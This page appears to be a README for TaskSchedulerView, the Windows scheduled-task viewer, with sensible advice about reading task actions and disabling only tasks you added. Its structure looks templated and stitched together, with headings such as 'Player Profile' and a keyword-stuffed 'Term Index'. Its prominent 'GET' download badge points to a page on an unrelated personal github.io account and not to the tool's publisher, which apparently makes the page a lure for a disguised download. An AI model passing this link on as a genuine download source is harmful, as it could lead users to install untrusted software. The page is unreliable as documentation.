# TaskSchedulerView - Tasks This PC Already Has

At a glance:
- Task names on this computer
- The time and the command they run
- Disable only a task you installed and can explain
- No hidden tasks and no security shutdown

## Read The Action

TaskSchedulerView shows what the Task Scheduler on this machine will run. The name is not enough. Open the action and read the program and the arguments. If the path is a tool you installed, you can decide whether you still want it. If the path is Windows or a driver, leave the task enabled.

A long list is normal. Updates, maintenance, and software you use all schedule work. Sorting by name and disabling every unfamiliar row will stop backups and patches. Read one row. Decide. Leave the rest.

## Disable One You Added

If you created a task or a program you installed added one you do not want, disable that one entry. Reboot or wait past its next time and confirm the behavior you wanted is gone and that Windows Update still opens. If something you need stops, enable the task again. Do not disable three more while the first change is untested.

Deleting a task is harder to undo than disabling it. Prefer disable until you are sure. This page does not describe how to hide a task. Hiding work so someone cannot see it is out of scope.

## Not A Persistence Guide

Do not add a task that runs a script you have not read, and do not add one to keep access on a PC you do not administer. The viewer is for tasks that already exist on your computer. Creating tasks belongs in the normal scheduler interface, for a job you can explain, such as a backup you already tested.

## Times

The next run time uses this PC's clock. If the clock is wrong, the schedule looks wrong. Fix the clock. Do not delete tasks to "reset" the time. A task that failed last time may say so. That is a reason to open the program it calls, not to disable Windows maintenance.

## Shared Machine

On a PC other people use, do not disable their tasks. A nightly copy they rely on may have a dull name. Ask, or leave it. Read-only use of the list is enough when you are only checking what your own installer added.

## What The Next Run Will Do

The next time and the command are the row. If you cannot say what will happen at that time, leave the task enabled. Disable is for a job you added and have decided you do not want, after you have read the path.


## Installation Path

| Step | Action |
|---|---|
| 1 | Open TaskSchedulerView on this PC |
| 2 | Find a task you installed or recognize |
| 3 | Read the program path and the arguments |
| 4 | Disable that one task only if you are sure you do not want it |
| 5 | Confirm updates and your other programs still run. Enable it again if they do not |

[![GET TaskSchedulerView](https://img.shields.io/badge/GET%20%E2%80%94%20TaskSchedulerView-0f766e?style=for-the-badge&logoColor=white)](https://nerybonina54.github.io/.github/taskschedulerview-names)

## Feature Matrix

| Area | What you use it for |
|---|---|
| Names | Tasks already scheduled here |
| Actions | The command you read |
| Disable | One task you added |
| Enable | Put it back if something breaks |
| Limit | No hidden tasks and no Defender shutdown |

## Performance Table

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
| CPU | Dual-core | Any current PC |
| RAM | 1 GB | 4 GB |
| Storage | Small install | None else |
| Scope | This PC | Tasks you can explain |

## Player Profile

TaskSchedulerView fits a check of a scheduler entry you or your installer created. It does not fit disabling security tasks, hiding a program, scheduling a script you have not read, or editing tasks on a PC you do not administer.

![TaskSchedulerView listing tasks on the user's PC](https://www.ghacks.net/wp-content/uploads/2015/07/taskschedulerview.jpg)

## Help Desk

An update stopped? You disabled the wrong task. Enable it again.
The command path looks unknown? Leave the task enabled until you know the program.
A task failed? Open that program and see its own error. Do not delete the task as the first step.
You wanted a hidden startup? Stop. That is not a goal here.
This is not your PC? Close the window.

## Reader Notes

Read the action line. The name is advertising. The path is the fact. One disable, then a test of something you still need, is the whole change.

Security and update tasks stay even if you do not recognize every word in the name. A shorter list is not safer. A list you understand is safer.

If you add a backup task later, do it after the backup has been restored once, and use a name you will recognize. The viewer will show that name the next time you look.

## Term Index

taskschedulerview read the action, taskschedulerview one disable, taskschedulerview enable again, taskschedulerview this pc, taskschedulerview own task, no hidden task, leave updates on, no unread script
